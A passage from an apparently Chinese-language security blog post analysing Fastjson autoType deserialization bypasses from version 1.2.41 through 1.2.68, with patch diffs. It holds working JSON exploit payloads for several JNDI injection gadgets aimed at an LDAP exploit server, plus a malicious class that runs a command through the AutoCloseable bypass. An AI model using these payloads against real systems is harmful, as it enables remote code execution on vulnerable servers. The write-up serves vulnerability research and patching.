&amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                            &#125;                            return clazz;                        &#125;                    &#125;                &#125;                if (clazz == null) &#123;                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false); // 在这一步进行只爱之前loadCLass()                &#125;                ...</code></pre><h3 id="1-2-41漏洞"><a href="#1-2-41漏洞" class="headerlink" title="1.2.41漏洞"></a>1.2.41漏洞</h3><blockquote><p>针对1.2.24版本漏洞补丁的绕过</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>只需在<code>@type</code>字段的首尾加多一个<code>L</code>和<code>;</code></p><p><strong>分析</strong></p><p>很粗暴的绕过方式，看过上面1.2.24版本的补丁可以知道，Fastjson会把对类名的修正（删除一些多余的描述符）放在了检查黑白名单的代码之后，这是个经典的<strong>TOCTOU漏洞</strong>，具体代码如下</p><p>在<code>com/alibaba/fastjson/util/TypeUtils.java</code>中的<code>loadClass()</code>方法中</p><pre><code class="java">public class TypeUtils &#123;    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;        if (className != null &amp;&amp; className.length() != 0) &#123;            Class&lt;?&gt; clazz = (Class)mappings.get(className);            if (clazz != null) &#123;                return clazz;            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);                return Array.newInstance(componentType, 0).getClass();            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123; // 绕过的条件                String newClassName = className.substring(1, className.length() - 1);                return loadClass(newClassName, classLoader);            &#125;             ...</code></pre><p>在该方法中有两处字符检查，第一处的作用是匹配以<code>&#39;[&#39;</code>开头的字符串，而第二处则是匹配以”L”开头，以”;”结尾的字符串</p><p><code>[LAutoTypeTest.ForTest;</code>这种类型的字符串其实是一种对函数返回值和参数的编码，名为<strong>JNI字段描述符</strong></p><p>其中首个字符”[“用以表示数组的层数，而第二个字符则代表数组的类型。</p><blockquote><p>这里举例说明一下JNI字段描述符的格式：</p><ol><li><p>double对应的类对象名为”[[D”</p></li><li><p>int[]对应的类对象名则为”[I”</p></li><li><p>AutoTypeTest.ForTest[]对应的类对象名则为”[LAutoTypeTest.ForTest;”</p></li></ol><p>而L为类描述符，”L”与”;”之间的字符串表示着该类对象的所属类（AutoTypeTest.ForTest）</p></blockquote><p><strong>Patch</strong></p><p>限制传入的类名长度，引入了黑名单加密混淆机制，将所有类型检验换成了<code>hashCode</code>，为了不让研究人员直接看到被明文黑白名单（但是可以爆破绕过，详细的可以看文章底下的<strong>哈希黑名单</strong>），然后在检验黑白名单之前先去掉首尾的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code></p><h3 id="1-2-42漏洞"><a href="#1-2-42漏洞" class="headerlink" title="1.2.42漏洞"></a>1.2.42漏洞</h3><blockquote><p>绕过1.2.41的补丁</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>直接再套多一层<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>即可绕过补丁</p><p><strong>分析</strong></p><p>跟进<code>checkAutoType()</code>函数</p><pre><code class="java">public class ParserConfig &#123;    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123; // 经过动态调试可以知道这里是去掉了一层&quot;L&quot;和&quot;;&quot;                className = className.substring(1, className.length() - 1);            &#125;            ...</code></pre><p><strong>Patch</strong></p><p>className开头是<code>&quot;LL&quot;</code>就抛出错误</p><pre><code class="java">public class ParserConfig &#123;    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123; // 检验开头是否为&quot;LL&quot;，然后抛出错误                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;                className = className.substring(1, className.length() - 1);            &#125;</code></pre><h3 id="1-2-43漏洞"><a href="#1-2-43漏洞" class="headerlink" title="1.2.43漏洞"></a>1.2.43漏洞</h3><blockquote><p>绕过1.2.42的补丁</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:false&#125;]&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>采用畸形<code>&quot;[&quot;</code>和<code>&quot;&#123;&quot;</code>进行绕过</p><p><strong>分析</strong></p><p>大家应该记得，除了前面用到的<code>&quot;L&quot;</code>和<code>&quot;;&quot;</code>，我们还会对首位的<code>&quot;[&quot;</code>进行修改，再一次看<code>loadClass()</code>函数</p><pre><code class="java">public class TypeUtils &#123;    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;        if (className != null &amp;&amp; className.length() != 0) &#123;            Class&lt;?&gt; clazz = (Class)mappings.get(className);            if (clazz != null) &#123;                return clazz;            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); // 删掉首位的&quot;[&quot;                return Array.newInstance(componentType, 0).getClass(); // 实例化类            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;                String newClassName = className.substring(1, className.length() - 1);                return loadClass(newClassName, classLoader);            &#125;            ...</code></pre><p>在Lexer分析完类名之后，此时Lexer已经分析到这个位置<code>[&#123;&quot;dataSourceName&quot;...</code>，而且代码将会检查token为16时后一个预期字符</p><pre><code class="java">// public final Object parseObject(Map object, Object fieldName)if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;    typeName = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);    if (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;        strValue = null;        Class clazz;        if (object != null &amp;&amp; object.getClass().getName().equals(typeName)) &#123;            clazz = object.getClass();        &#125; else &#123;            clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures());        &#125;        if (clazz != null) &#123;            lexer.nextToken(16); // 检查expect为16的token            if (lexer.token() == 13) &#123;                lexer.nextToken(16);// public final void nextToken(int expect)case 16:    if (this.ch == &#39;,&#39;) &#123;        this.token = 16;        this.next();        return;    &#125;    if (this.ch == &#39;&#125;&#39;) &#123;        this.token = 13;        this.next();        return;    &#125;    if (this.ch == &#39;]&#39;) &#123;        this.token = 15;        this.next();        return;    &#125;    if (this.ch == 26) &#123;        this.token = 20;        return;    &#125;    break;    ...    if (this.ch != &#39; &#39; &amp;&amp; this.ch != &#39;\n&#39; &amp;&amp; this.ch != &#39;\r&#39; &amp;&amp; this.ch != &#39;\t&#39; &amp;&amp; this.ch != &#39;\f&#39; &amp;&amp; this.ch != &#39;\b&#39;) &#123;        this.nextToken(); // 因为我们的payload的类名的后一个字符为&#39;[&#39;，所以会调用nextToken()函数设置新的token        return;    &#125;    ...// public final void nextToken() case &#39;[&#39;:    this.next();    this.token = 14; // 将token设置为14    return;</code></pre><p>下面阐述一下为什么一定要把token设置为14</p><pre><code class="java">// public final Object parseObject(Map object, Object fieldName)ObjectDeserializer deserializer = this.config.getDeserializer(clazz);thisObj = deserializer.deserialze(this, clazz, fieldName); // 进入反序列化return thisObj;// public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName)JSONArray array = new JSONArray();parser.parseArray((Type)componentType, array, fieldName); // 解析类成员return this.toObjectArray(parser, componentClass, array);// public void parseArray(Type type, Collection array, Object fieldName)if (token != 14) &#123; // token不等于14就会报错    throw new JSONException(&quot;exepct &#39;[&#39;, but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());&#125; else &#123;    ObjectDeserializer deserializer = null;    if (Integer.TYPE == type) &#123;        deserializer = IntegerCodec.instance;        this.lexer.nextToken(2);    &#125; else if (String.class == type) &#123;        deserializer = StringCodec.instance;        this.lexer.nextToken(4);    &#125; else &#123;        deserializer = this.config.getDeserializer(type);        this.lexer.nextToken(((ObjectDeserializer)deserializer).getFastMatchToken()); // getFastMatchToken()返回的是12，可以成功搜索到下一个字符是&#39;&#123;&#39;，对应的token设置为12    &#125;    ParseContext context = this.context;    this.setContext(array, fieldName);    try &#123;        int i = 0;        while(true) &#123;            if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;                while(this.lexer.token() == 16) &#123;                    this.lexer.nextToken();                &#125;            &#125;            if (this.lexer.token() == 15) &#123;                break;            &#125;            Object val;            if (Integer.TYPE == type) &#123;                val = IntegerCodec.instance.deserialze(this, (Type)null, (Object)null);                array.add(val);            &#125; else if (String.class == type) &#123;                String value;                if (this.lexer.token() == 4) &#123;                    value = this.lexer.stringVal();                    this.lexer.nextToken(16);                &#125; else &#123;                    Object obj = this.parse();                    if (obj == null) &#123;                        value = null;                    &#125; else &#123;                        value = obj.toString();                    &#125;                &#125;                array.add(value);            &#125; else &#123;                if (this.lexer.token() == 8) &#123;                    this.lexer.nextToken();                    val = null;                &#125; else &#123;                    val = ((ObjectDeserializer)deserializer).deserialze(this, type, i); // 因为token是12，所以最终会走到这一步完成反序列化                &#125;</code></pre><p><strong>Patch</strong></p><p>判断类型的第一个字符是否为”[“</p><pre><code class="java">public class ParserConfig &#123;    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;            if (h1 == -5808493101479473382L) &#123;                throw new JSONException(&quot;autoType is not support. &quot; + typeName); // 第一个字符是否为&quot;[&quot;则抛出错误            &#125;</code></pre><h3 id="1-2-45漏洞"><a href="#1-2-45漏洞" class="headerlink" title="1.2.45漏洞"></a>1.2.45漏洞</h3><blockquote><p>利用了一条黑名单中不包含的元素，从而绕过了黑名单限制，需要额外安装mybatis库</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>JndiDataSourceFactory不在黑名单中，通过指定data_source实现JNDI注入</p><p><strong>分析</strong></p><p>直接放图</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105241715d814a1a9336319d4f794.png" alt="image-20210524170435859" style="zoom:80%;" /><p>从这个代码可以看到也可以用<code>initial_context</code>属性，但是还要同时设置<code>data_source</code>属性才能用，所以就没什么必要</p><p><strong>Patch</strong></p><p>扩充了不少黑名单</p><h3 id="1-2-47漏洞"><a href="#1-2-47漏洞" class="headerlink" title="1.2.47漏洞"></a>1.2.47漏洞</h3><blockquote><p>使用新的Gadget绕过黑名单</p><p>需要 1.2.33 ≤ Fastjson版本 ≤ 1.2.47，是否开启setAutoTypeSupport都能成功</p><p>需要 1.2.25 ≤ Fastjson版本 ≤ 1.2.32，关闭setAutoTypeSupport能成功</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>由于Poc开头不为<code>@type</code>等预置类型，所以按Map类型解析，其中会调用<code>parseObject()</code>，第一次反序列化时，<code>java.lang.Class</code>绕过黑名单，将<code>com.sun.rowset.JdbcRowSetImpl</code>加入到缓存数组，第二次反序列化时，由于<code>com.sun.rowset.JdbcRowSetImpl</code>已在缓存之中，所以绕过了黑名单检测的过程，成功进行JNDI注入</p><p><strong>分析</strong></p><p>在IDEA中把mappings成员添加到断点中</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020d3262fb8bf8cb8b77d92.png" alt="image-20210524175959882" style="zoom: 67%;" /><p>勾上<code>Field access</code>选项</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020e7c324ba7cb18e536e22.png" alt="image-20210524180038665" style="zoom: 67%;" /><p>在运行完<code>java.lang.Class</code>类的<code>parseObject()</code>函数之后再进行监听，持续跟进就会看到调用到下面的<code>loadClass()</code>函数，大概情况就是<code>java.lang.Class</code>在反序列化时会把<code>value</code>属性值识别为<code>Object</code>类型，如果<code>key</code>值本身又属于<code>Class.class</code>类型时，便会对<code>value</code>属性值调用下面的<code>loadClass()</code>函数把这个<code>Object</code>加载进来</p><pre><code class="java">public class TypeUtils &#123;    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;        if (className != null &amp;&amp; className.length() != 0) &#123;            Class&lt;?&gt; clazz = (Class)mappings.get(className);            if (clazz != null) &#123;                return clazz;            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);                return Array.newInstance(componentType, 0).getClass();            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;                String newClassName = className.substring(1, className.length() - 1);                return loadClass(newClassName, classLoader);            &#125; else &#123;                try &#123;                    if (classLoader != null) &#123;                        clazz = classLoader.loadClass(className);                        if (cache) &#123;                            mappings.put(className, clazz);                        &#125;                        return clazz;                    &#125;                &#125; catch (Throwable var7) &#123;                    var7.printStackTrace();                &#125;                try &#123;                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();                    if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) &#123;                        clazz = contextClassLoader.loadClass(className);                        if (cache) &#123; // 支持缓存                            mappings.put(className, clazz); // 把类名和类存进mappings                        &#125;                        return clazz;                    &#125;                &#125; catch (Throwable var6) &#123;                &#125;                try &#123;                    clazz = Class.forName(className);                    mappings.put(className, clazz);                    return clazz;                &#125; catch (Throwable var5) &#123;                    return clazz;                &#125;            &#125;        &#125; else &#123;            return null;        &#125;    &#125;</code></pre><p>当第二次解析<code>@type</code>时就可以绕过黑名单校验了</p><pre><code class="java">public class ParserConfig &#123;    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        ...        if (this.autoTypeSupport || expectClass != null) &#123;            hash = h3;            for(i = 3; i &lt; className.length(); ++i) &#123;                hash ^= (long)className.charAt(i);                hash *= 1099511628211L;                if (Arrays.binarySearch(this.acceptHashCodes, hash) &gt;= 0) &#123;                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);                    if (clazz != null) &#123;                        return clazz;                    &#125;                &#125;                if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123; // 当第二次解析@type时，com.sun.rowset.JdbcRowSetImpl以存储在mappings中，导致绕过黑名单                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;            &#125;        &#125;</code></pre><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242043a777324565c5c5c4d5b4.png" alt="image-20210524172832135" style="zoom:80%;" /><p><strong>Patch</strong></p><p>把<code>java.lang.Class</code>列入黑名单，把默认缓存从True改为False</p><h3 id="1-2-62漏洞"><a href="#1-2-62漏洞" class="headerlink" title="1.2.62漏洞"></a>1.2.62漏洞</h3><blockquote><p>使用新的Gadget绕过黑名单</p><p>需要 Fastjson版本 ≤ 1.2.62，并且需要开启setAutoTypeSupport</p><p>需要额外安装xbean-reflect（我的测试版本为3.4）</p></blockquote><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p><strong>分析</strong></p><pre><code class="java">package org.apache.xbean.propertyeditor;public abstract class AbstractConverter extends PropertyEditorSupport implements Converter     public final void setAsText(String text) &#123;        Object value = this.toObject(text.trim()); // 调用toObject()函数        super.setValue(value);    &#125;    public final Object toObject(String text) &#123;        if (text == null) &#123;            return null;        &#125; else &#123;            Object value = this.toObjectImpl(text.trim()); // 调用toObjectImpl()函数            return value;        &#125;    &#125;</code></pre><pre><code class="java">package org.apache.xbean.propertyeditor;public class JndiConverter extends AbstractConverter &#123;    protected Object toObjectImpl(String text) &#123;        try &#123;            InitialContext context = new InitialContext();            return (Context)context.lookup(text); // 调用lookup()函数实现JNDI注入        &#125; catch (NamingException var3) &#123;            throw new PropertyEditorException(var3);        &#125;    &#125;&#125;</code></pre><p>这里提供了一个新的思路就是可以从父类中找<code>set</code>函数，但也算不上是新的思路，只不过是找到第三方库里面的<code>lookup()</code>函数再向上回溯罢了 : )</p><p><strong>Patch</strong></p><p>扩充黑名单</p><h3 id="1-2-66漏洞"><a href="#1-2-66漏洞" class="headerlink" title="1.2.66漏洞"></a>1.2.66漏洞</h3><blockquote><p>使用新的Gadget绕过黑名单</p><p>需要 Fastjson版本 ≤ 1.2.66，并且需要开启setAutoTypeSupport</p><p>下面用到的Gadget都需要导入第三方库，直接搜就好，部分触发时必须使用parseObject()函数</p></blockquote><p>公开的Gadget一共有下面四个：</p><p><strong>JndiObjectFactory</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>触发代码如下：</p><pre><code class="java">package org.apache.shiro.jndi;public class JndiObjectFactory&lt;T&gt; extends JndiLocator implements Factory&lt;T&gt; &#123;    public void setResourceName(String resourceName) &#123;        this.resourceName = resourceName; // 传入resourceName    &#125;    public T getInstance() &#123;        try &#123;            return this.requiredType != null ? this.requiredType.cast(this.lookup(this.resourceName, this.requiredType)) : this.lookup(this.resourceName); // 触发JNDI注入        &#125; catch (NamingException var3) &#123;            String typeName = this.requiredType != null ? this.requiredType.getName() : &quot;object&quot;;            throw new IllegalStateException(&quot;Unable to look up &quot; + typeName + &quot; with jndi name &#39;&quot; + this.resourceName + &quot;&#39;.&quot;, var3);        &#125;    &#125;</code></pre><p><strong>AnterosDBCPConfig</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>触发代码如下：</p><pre><code class="java">package br.com.anteros.dbcp;public class AnterosDBCPConfig implements AnterosDBCPConfigMXBean &#123;    public void setMetricRegistry(Object metricRegistry) &#123;        if (this.metricsTrackerFactory != null) &#123;            throw new IllegalStateException(&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;);        &#125; else &#123;            if (metricRegistry != null) &#123;                metricRegistry = this.getObjectOrPerformJndiLookup(metricRegistry); // 传入metricRegistry                if (!UtilityElf.safeIsAssignableFrom(metricRegistry, &quot;com.codahale.metrics.MetricRegistry&quot;) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, &quot;io.micrometer.core.instrument.MeterRegistry&quot;)) &#123;                    throw new IllegalArgumentException(&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;);                &#125;            &#125;            this.metricRegistry = metricRegistry;        &#125;    &#125;    private Object getObjectOrPerformJndiLookup(Object object) &#123;        if (object instanceof String) &#123;            try &#123;                InitialContext initCtx = new InitialContext();                return initCtx.lookup((String)object); // 触发JNDI注入            &#125; catch (NamingException var3) &#123;                throw new IllegalArgumentException(var3);            &#125;        &#125; else &#123;            return object;        &#125;    &#125;</code></pre><p><strong>CacheJndiTmLookup</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\&quot;jndiNames\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>触发代码如下：</p><pre><code class="java">package org.apache.ignite.cache.jta.jndi;public class CacheJndiTmLookup implements CacheTmLookup &#123;    public void setJndiNames(List&lt;String&gt; jndiNames) &#123;        this.jndiNames = jndiNames; // 传入jndiNames    &#125;    @Nullable    public TransactionManager getTm() throws IgniteException &#123;        assert this.jndiNames != null;        assert !this.jndiNames.isEmpty();        try &#123;            InitialContext ctx = new InitialContext();            Iterator var2 = this.jndiNames.iterator(); // 获取jndiNames            Object obj;            do &#123;                if (!var2.hasNext()) &#123;                    return null;                &#125;                String s = (String)var2.next(); // 获取jndiNames                obj = ctx.lookup(s); // 触发JNDI注入            &#125; while(obj == null || !(obj instanceof TransactionManager));            return (TransactionManager)obj;        &#125; catch (NamingException var5) &#123;            throw new IgniteException(&quot;Unable to lookup TM by: &quot; + this.jndiNames, var5);        &#125;    &#125;</code></pre><p><strong>JtaTransactionConfig</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>触发代码如下：</p><pre><code class="java">package com.ibatis.sqlmap.engine.transaction.jta;public class JtaTransactionConfig extends BaseTransactionConfig &#123;    public void setProperties(Properties props) throws SQLException, TransactionException &#123;        String utxName = null;        try &#123;            utxName = (String)props.get(&quot;UserTransaction&quot;); // 这里需要传入一个Properties对象，然后里面UserTransaction属性的值            InitialContext initCtx = new InitialContext();            this.userTransaction = (UserTransaction)initCtx.lookup(utxName); // 触发JNDI注入        &#125; catch (NamingException var4) &#123;            throw new SqlMapException(&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot; + utxName + &quot;).  Cause: &quot; + var4);        &#125;    &#125;</code></pre><p><strong>Patch</strong></p><p>扩充黑名单</p><h3 id="1-2-68漏洞"><a href="#1-2-68漏洞" class="headerlink" title="1.2.68漏洞"></a>1.2.68漏洞</h3><blockquote><p>1.2.68版本增加了新的安全参数<strong>safeMode</strong>，具体可参考这个<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">链接</a>，当safeMode开启后，autoType会被完全禁用，但是默认情况下时关闭的，开启safeMode代码：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code> </p></blockquote><p><strong>恶意类</strong></p><pre><code class="java">package com.fastjson;import java.io.IOException;public class Exp implements AutoCloseable &#123;    public Exp () &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void close() throws Exception &#123;     &#125;&#125;</code></pre><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;com.fastjson.Exp\&quot;&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p>在不开启<code>safeMode</code>的情况下，我们可以使用<code>java.lang.AutoCloseable</code>引入任意恶意类，和<strong>1.2.47</strong>版本的洞很类似，这里利用到的是<code>checkAutoType()</code>函数中<code>expectClass</code>参数，如果加载的类实现了<code>expectClass</code>接口，或者是属于<code>expectClass</code>的子类，那么<code>checkAutoType()</code>函数就会检测通过</p><p>利用这个特点，我们可以利用一个<code>TypeUtils.mappings</code>自带的类<code>java.lang.AutoCloseable</code>，这个类在进行反序列化时，如果检验到后面的字符串也是一个类的话，就会把自己作为<code>expectClass</code>调用<code>checkAutoType()</code>函数，这时候如果我们将恶意类编写成实现了<code>java.lang.AutoCloseable</code>接口的类，就可以成功绕过<code>checkAutoType()</code></p><p><strong>分析</strong></p><pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;        protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features, int[] setFlags) &#123;        ...        if (!ref.equals(this.beanInfo.typeName) &amp;&amp; !parser.isEnabled(Feature.IgnoreAutoType)) &#123;            refObj = getSeeAlso(config, this.beanInfo, ref);            Class&lt;?&gt; userType = null;            if (refObj == null) &#123;                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);                userType = config.checkAutoType(ref, expectClass, lexer.getFeatures()); // ref实现了java.lang.AutoCloseable接口的恶意类，java.lang.AutoCloseable作为expectClass参数传入                refObj = parser.getConfig().getDeserializer(userType);            &#125;            Object typedObject = ((ObjectDeserializer)refObj).deserialze(parser, userType, fieldName); // 绕过成功之后进行反序列化        ...</code></pre><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><ul><li>在1.2.43版本之前的漏洞主要是通过在类名中加入混淆字符而绕过<code>checkAutoType()</code>，特别是1.2.43版本的漏洞利用让我知道了即使json字符串不规范也是可以解析成功的</li><li>在1.2.45版本之后大部分都是通过第三方库寻找新的Gadget来绕过黑白名单，通过检查其实例创建函数或者set函数是否存在<code>lookup()</code>函数以及参数是否可控来挖掘</li><li>1.2.47版本的漏洞利用十分的巧妙，通过分析黑名单校验的<code>getClassFromMapping()</code>字段，想到用缓存进行绕过</li><li>1.2.68版本的漏洞利用也是同样巧妙，通过分析<code>expectClass</code>字段是否可控挖掘出了<code>java.lang.AutoCloseable</code>的Gadget，而且在Fastjson的可利用类中还存在着更多类似的利用，所以了解<code>checkAutoType()</code>方法中的可利用类十分必要，它们分别有：<ul><li>白名单（符合白名单条件的类）</li><li>TypeUtils.mappings （符合缓存映射中获取的类）</li><li>typeMapping （ParserConfig中本身带有的集合）</li><li>deserializers （符合反序列化器的类）</li></ul></li></ul><h2 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h2><p>由某些大哥爆破出来的哈希黑名单列表：<a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/994/">Fastjson 流程分析及 RCE 分析</a></p><p><a 